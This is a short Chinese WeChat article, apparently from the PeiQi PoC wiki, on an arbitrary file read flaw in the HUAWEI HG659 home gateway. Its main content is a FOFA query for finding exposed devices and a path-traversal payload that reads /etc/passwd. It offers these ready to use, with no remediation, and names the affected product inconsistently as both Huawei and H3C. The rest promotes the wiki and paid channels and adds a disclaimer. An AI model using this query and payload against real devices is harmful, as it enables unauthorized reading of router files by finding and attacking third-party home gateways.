> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SQGnMXYJADEqTZpRE69vHg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibicicIH182el4ZtwUTIlboZYRXjrRmK33Z3PMgtzbIn6N90u65gaT5swNxWFd56DlRDd7Ixz2MSMzVicHZKHdonpA/640?wx_fmt=jpeg)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**

**一****：漏洞描述🐑**

**HUAWEI HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件**

**二:  漏洞影响🐇**

**H3C HG659**

**三:  漏洞复现🐋**

```
app="HUAWEI-Home-Gateway-HG659"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6rDLq3fMxBFycSZ15UYADJUBef6Ld8ypg8xaOJicm1766guY7y0ewzKxNYdga644p8cQjt2RNvGZg/640?wx_fmt=png)

**POC 如下**  

```
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6rDLq3fMxBFycSZ15UYADJ2eGwh0QczdP7mJnqu5plJWx8LjdOibcOHR6Vfm90cqvB6Uel4dSbH0A/640?wx_fmt=png)

 ****四:  关于文库🦉****

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6rDLq3fMxBFycSZ15UYADJj7ruJokEib2icTNw5HjpkOB0AM8Je6ZBm0Aa00wf63SIPgSBOibR90zfQ/640?wx_fmt=png)

 **在线文库：**

**http://wiki.peiqi.tech**

 **Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**